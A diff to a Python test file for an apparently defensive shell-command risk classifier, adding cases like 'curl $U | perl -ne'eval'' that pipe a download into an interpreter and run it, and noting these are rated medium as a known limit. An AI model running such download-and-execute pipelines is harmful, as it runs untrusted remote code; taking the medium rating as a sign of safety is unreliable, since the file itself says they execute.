@@ -22,8 +22,9 @@ the classifier reads an option or a name it does not resolve as possibly running
 below the floor does.
 
 Two forms the fixture does not hold are rated below the released classifier on purpose,
-because it misread them and neither runs anything:
-`test_forms_the_released_classifier_misread_run_nothing` lists them.
+because it misread them: `test_forms_the_released_classifier_misread_are_medium` lists
+them. The first runs nothing. The second is rated as a separate `-e` always was, by a
+program the classifier does not read, so it holds a command that runs the download.
 """
 
 from __future__ import annotations
@@ -527,7 +528,9 @@ def test_an_attached_value_letter_without_a_script_leaves_the_program_critical(
 # and it did not see a code flag that ends an option bundle, so it read the interpreter
 # as given no program. `>|` is POSIX's redirection that overrides noclobber (bash and dash
 # write the file and run nothing), `perl -ne` and `python3 -uc` exit for want of a
-# program, and `-ne'print'` reads the download as data, so none of them runs it.
+# program, and `-ne'print'` reads the download as data, so none of them runs it. The
+# attached program is not read, as the program after a separate `-e` never was, so
+# `-ne'eval'`, which runs each line of the download, is medium with them: a known limit.
 @pytest.mark.parametrize(
     "command",
     [
@@ -537,6 +540,9 @@ def test_an_attached_value_letter_without_a_script_leaves_the_program_critical(
         "curl -o a $U | cat >| a",
         "curl $U | perl -ne",
         "curl $U | perl -ne'print'",
+        "curl $U | perl -ne'eval'",
+        "curl $U | perl -ne 'eval'",
+        "curl $U | perl -e 'eval join q(), <STDIN>'",
         "curl $U | sudo perl -ne",
         "curl $U | python3 -uc",
         "curl $U | env python -uc",
@@ -544,7 +550,7 @@ def test_an_attached_value_letter_without_a_script_leaves_the_program_critical(
         "echo $B | base64 -d | perl -ne",
     ],
 )
-def test_forms_the_released_classifier_misread_run_nothing(command: str) -> None:
+def test_forms_the_released_classifier_misread_are_medium(command: str) -> None:
     assert _command_severity(command) is RiskSeverity.MEDIUM
 
 
